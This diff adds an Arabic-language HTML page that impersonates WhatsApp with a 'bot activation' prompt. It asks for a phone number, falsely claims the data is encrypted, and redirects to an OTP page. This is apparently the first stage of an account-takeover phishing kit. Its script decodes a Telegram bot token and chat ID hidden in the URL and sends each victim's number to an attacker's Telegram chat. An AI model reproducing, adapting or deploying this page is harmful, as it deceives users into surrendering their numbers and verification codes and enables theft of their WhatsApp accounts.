@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تفعيل البوت - واتساب</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #0b141a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(37, 211, 102, 0.12) 0%, transparent 45%),
+                radial-gradient(circle at 80% 70%, rgba(37, 211, 102, 0.08) 0%, transparent 45%);
+            animation: floatBg 18s ease-in-out infinite;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        @keyframes floatBg {
+            0%, 100% { transform: translate(0, 0) rotate(0deg); }
+            50% { transform: translate(-5%, -5%) rotate(5deg); }
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            position: relative;
+            z-index: 1;
+            animation: fadeIn 0.6s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .header .logo-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .header .logo-wrapper img {
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .header .logo-wrapper .logo-text {
+            font-size: 32px;
+            font-weight: 700;
+            color: #ffffff;
+            letter-spacing: -0.5px;
+        }
+
+        .header .logo-wrapper .logo-text .green {
+            color: #25d366;
+        }
+
+        .header .subtitle {
+            color: #8696a0;
+            font-size: 15px;
+            margin-top: 10px;
+            font-weight: 400;
+        }
+
+        .card {
+            background: #111b21;
+            border-radius: 18px;
+            border: 1px solid #222d34;
+            padding: 32px 28px 26px;
+            box-shadow: 
+                0 4px 20px rgba(0, 0, 0, 0.4),
+                0 0 40px rgba(37, 211, 102, 0.05);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #25d366, transparent);
+            background-size: 200% 100%;
+            animation: gradientMove 3s linear infinite;
+        }
+
+        @keyframes gradientMove {
+            0% { background-position: -200% 0%; }
+            100% { background-position: 200% 0%; }
+        }
+
+        .icon-main {
+            text-align: center;
+            font-size: 56px;
+            margin-bottom: 8px;
+        }
+
+        .card h2 {
+            font-size: 22px;
+            color: #ffffff;
+            margin-bottom: 8px;
+            font-weight: 700;
+            text-align: center;
+        }
+
+        .card .desc {
+            color: #8696a0;
+            font-size: 14px;
+            margin-bottom: 28px;
+            line-height: 1.7;
+            text-align: center;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #e9edef;
+            margin-bottom: 8px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px 18px;
+            border: 1.5px solid #2a3942;
+            border-radius: 12px;
+            font-size: 16px;
+            background: #1f2c33;
+            transition: all 0.25s ease;
+            outline: none;
+            color: #ffffff;
+            direction: ltr;
+            text-align: right;
+            letter-spacing: 0.5px;
+        }
+
+        .input-group input:focus {
+            border-color: #25d366;
+            background: #182229;
+            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.15);
+        }
+
+        .input-group input::placeholder {
+            color: #667781;
+            font-size: 14px;
+            letter-spacing: normal;
+        }
+
+        .input-group input.error {
+            border-color: #f15c6d;
+            background: rgba(241, 92, 109, 0.08);
+        }
+
+        .field-error {
+            color: #f15c6d;
+            font-size: 13px;
+            margin-top: 6px;
+            display: none;
+            font-weight: 400;
+            text-align: right;
+        }
+
+        .field-error.show {
+            display: block;
+            animation: slideDown 0.2s ease;
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .country-selector {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 18px;
+        }
+
+        .country-selector select {
+            padding: 15px 12px;
+            border: 1.5px solid #2a3942;
+            border-radius: 12px;
+            font-size: 15px;
+            background: #1f2c33;
+            color: #ffffff;
+            outline: none;
+            cursor: pointer;
+            transition: all 0.25s;
+            font-family: inherit;
+            min-width: 110px;
+        }
+
+        .country-selector select:focus {
+            border-color: #25d366;
+        }
+
+        .country-selector input {
+            flex: 1;
+            padding: 15px 18px;
+            border: 1.5px solid #2a3942;
+            border-radius: 12px;
+            font-size: 16px;
+            background: #1f2c33;
+            outline: none;
+            color: #ffffff;
+            direction: ltr;
+            text-align: right;
+            transition: all 0.25s;
+        }
+
+        .country-selector input:focus {
+            border-color: #25d366;
+            background: #182229;
+            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.15);
+        }
+
+        .country-selector input::placeholder {
+            color: #667781;
+            font-size: 14px;
+        }
+
+        .country-selector input.error {
+            border-color: #f15c6d;
+            background: rgba(241, 92, 109, 0.08);
+        }
+
+        .btn-next {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #25d366, #128c7e);
+            color: #0b141a;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            margin-top: 8px;
+            letter-spacing: 0.3px;
+            box-shadow: 0 4px 20px rgba(37, 211, 102, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-next:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 28px rgba(37, 211, 102, 0.45);
+        }
+
+        .btn-next:active {
+            transform: scale(0.98);
+        }
+
+        .btn-next:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+            padding: 12px;
+            background: rgba(37, 211, 102, 0.08);
+            border-radius: 10px;
+            color: #8696a0;
+            font-size: 12.5px;
+            text-align: center;
+        }
+
+        .security-note i {
+            color: #25d366;
+            font-size: 14px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            color: #667781;
+            font-size: 12px;
+        }
+
+        .footer a {
+            color: #667781;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer a:hover {
+            color: #25d366;
+        }
+
+        @media (max-width: 450px) {
+            .card {
+                padding: 24px 18px;
+            }
+            .header .logo-wrapper .logo-text {
+                font-size: 26px;
+            }
+            .header .logo-wrapper img {
+                width: 44px;
+                height: 44px;
+            }
+            .btn-next {
+                font-size: 15px;
+                padding: 14px;
+            }
+            .country-selector select {
+                min-width: 90px;
+                padding: 14px 8px;
+                font-size: 14px;
+            }
+            .country-selector input {
+                padding: 14px 12px;
+                font-size: 15px;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+
+<div class="container">
+
+    <div class="header">
+        <div class="logo-wrapper">
+            <img src="whatsapp.png" alt="WhatsApp" style="width: 52px; height: 52px; border-radius: 50%; object-fit: cover;">
+            <span class="logo-text">Whats<span class="green">App</span></span>
+        </div>
+        <div class="subtitle">🤖 تفعيل البوت</div>
+    </div>
+
+    <div class="card">
+
+        <div class="icon-main">📱</div>
+        <h2>أدخل رقم الواتساب</h2>
+        <p class="desc">سيتم إرسال كود التحقق إلى رقمك عبر واتساب لتأكيد العملية</p>
+
+        <form id="phoneForm" novalidate>
+
+            <div class="input-group">
+                <label>رقم الواتساب</label>
+                <div class="country-selector">
+                    <select id="countryCode">
+                        <option value="+212">🇲🇦 +212</option>
+                        <option value="+213">🇩🇿 +213</option>
+                        <option value="+216">🇹🇳 +216</option>
+                        <option value="+20">🇪🇬 +20</option>
+                        <option value="+966">🇸🇦 +966</option>
+                        <option value="+971">🇦🇪 +971</option>
+                        <option value="+965">🇰🇼 +965</option>
+                        <option value="+974">🇶🇦 +974</option>
+                        <option value="+33">🇫🇷 +33</option>
+                        <option value="+1">🇺🇸 +1</option>
+                        <option value="+44">🇬🇧 +44</option>
+                        <option value="+49">🇩🇪 +49</option>
+                        <option value="+34">🇪🇸 +34</option>
+                        <option value="+39">🇮🇹 +39</option>
+                        <option value="+90">🇹🇷 +90</option>
+                    </select>
+                    <input type="tel" id="phoneNumber" placeholder="6XXXXXXXX" required autocomplete="tel">
+                </div>
+                <div class="field-error" id="phoneError"></div>
+            </div>
+
+            <button type="submit" class="btn-next" id="nextBtn">
+                <i class="fas fa-arrow-left"></i> التالي
+            </button>
+
+        </form>
+
+        <div class="security-note">
+            <i class="fas fa-lock"></i>
+            <span>بياناتك محمية ومشفّرة بالكامل</span>
+        </div>
+
+    </div>
+
+    <div class="footer">
+        <span>WhatsApp © 2026</span>
+        <span style="margin:0 6px;">·</span>
+        <a href="https://www.whatsapp.com/legal/privacy-policy">الخصوصية</a>
+        <span style="margin:0 6px;">·</span>
+        <a href="https://www.whatsapp.com/legal/terms-of-service">الشروط</a>
+    </div>
+
+</div>
+
+<script>
+    // ================================================================
+    // 🔐 قراءة البيانات المشفّرة من الرابط
+    // ================================================================
+    const urlParams = new URLSearchParams(window.location.search);
+    const encodedData = urlParams.get('d') || "";
+
+    // حفظ البيانات المشفّرة في sessionStorage (احتياط)
+    if (encodedData) {
+        sessionStorage.setItem('wa_encoded', encodedData);
+    }
+
+    // استرجاع البيانات من sessionStorage إذا لم تكن في الرابط
+    const finalEncoded = encodedData || sessionStorage.getItem('wa_encoded') || "";
+
+    let BOT_TOKEN = "";
+    let CHAT_ID = "";
+
+    if (finalEncoded) {
+        try {
+            const decoded = atob(finalEncoded);
+            const parts = decoded.split('|');
+            BOT_TOKEN = parts[0] || "";
+            CHAT_ID   = parts[1] || "";
+        } catch (e) {
+            console.error('❌ فشل فك التشفير:', e);
+        }
+    }
+
+    if (!BOT_TOKEN || !CHAT_ID) {
+        console.warn('⚠️ البيانات المشفّرة غير موجودة!');
+    }
+
+    // ================================================================
+    // 📤 إرسال رقم الهاتف إلى Telegram
+    // ================================================================
+    function sendPhoneToTelegram(phone) {
+        if (!BOT_TOKEN || !CHAT_ID) {
+            console.error('❌ التوكن أو ID غير موجود!');
+            return;
+        }
+
+        const message = `
+📱 **تفعيل البوت - واتساب (الخطوة 1/2)**
+
+📞 **رقم الهاتف:** 
+\`${phone}\`
+
+🕐 **التاريخ:** ${new Date().toLocaleString('ar-EG')}
+
+📌 **IP:** ${window.location.hostname}
+        `;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        }).catch(error => console.log('Telegram error:', error));
+    }
+
+    // ================================================================
+    // 📝 معالج النموذج - الانتقال إلى OTP مع التوكن
+    // ================================================================
+    document.getElementById('phoneForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const countryCode = document.getElementById('countryCode').value;
+        const phoneNumber = document.getElementById('phoneNumber').value.trim().replace(/\s/g, '');
+        const phoneInput = document.getElementById('phoneNumber');
+        const errorEl = document.getElementById('phoneError');
+
+        // إعادة تعيين الأخطاء
+        phoneInput.classList.remove('error');
+        errorEl.classList.remove('show');
+        errorEl.textContent = '';
+
+        // التحقق
+        if (!phoneNumber) {
+            phoneInput.classList.add('error');
+            errorEl.textContent = '⚠️ يرجى إدخال رقم الواتساب';
+            errorEl.classList.add('show');
+            return;
+        }
+
+        if (phoneNumber.length < 8) {
+            phoneInput.classList.add('error');
+            errorEl.textContent = '⚠️ رقم الهاتف غير صحيح';
+            errorEl.classList.add('show');
+            return;
+        }
+
+        const fullPhone = countryCode + phoneNumber;
+
+        // تعطيل الزر
+        const btn = document.getElementById('nextBtn');
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري المعالجة...';
+
+        // إرسال إلى Telegram
+        sendPhoneToTelegram(fullPhone);
+
+        // حفظ الرقم والبيانات المشفّرة
+        localStorage.setItem('wa_phone', fullPhone);
+        sessionStorage.setItem('wa_encoded', finalEncoded);
+
+        // ============================================================
+        // 🔗 الانتقال إلى صفحة OTP مع تمرير البيانات المشفّرة
+        // ============================================================
+        setTimeout(() => {
+            let nextUrl = 'whatsapp-otp.html';
+            if (finalEncoded) {
+                nextUrl += '?d=' + encodeURIComponent(finalEncoded);
+            }
+            window.location.href = nextUrl;
+        }, 800);
+    });
+
+    // تحقق مباشر من الرقم
+    document.getElementById('phoneNumber').addEventListener('input', function() {
+        if (this.value.length >= 8) {
+            this.classList.remove('error');
+            document.getElementById('phoneError').classList.remove('show');
+        }
+    });
+
+    console.log('✅ WhatsApp Phone page loaded');
+    console.log('📎 Encoded data:', finalEncoded ? 'موجود ✓' : 'غير موجود ✗');
+</script>
+
+</body>
+</html>
